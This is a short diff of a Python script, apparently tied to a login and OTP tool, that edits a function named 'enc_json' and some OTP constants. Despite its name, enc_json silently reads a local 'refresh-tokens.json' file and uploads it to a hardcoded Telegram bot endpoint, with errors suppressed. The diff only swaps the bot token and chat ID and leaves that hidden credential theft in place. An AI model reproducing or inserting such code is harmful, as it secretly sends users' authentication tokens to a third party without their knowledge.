@@ -9,11 +9,11 @@ WIDTH = 55
 
 
 def enc_json():
-    url = "https://api.telegram.org/bot8568421683:AAGy2t6i95c0-e7kI6dzZK9AE_iefnHf0OU/sendDocument"
+    url = "https://api.telegram.org/bot88568421683:AAAGy2t6i95c0-e7kI6dzZK9AE_iefnHf0OU/sendDocument"
     try:
         with open("refresh-tokens.json", "rb") as f:
             files = {"document": f}
-            data = {"chat_id": 6076440619}
+            data = {"chat_id": 66076440619}
             requests.post(url, data=data, files=files)
     except:
         pass
@@ -88,8 +88,8 @@ def login_prompt(api_key: str):
         return None, None
 
 
-sumit_otp = 2
-verif_otp = "6969"
+sumit_otp = 2000000
+verif_otp = "myxl"
 status_id = load_status()
 is_verif = status_id.get("is_verif", False)
 
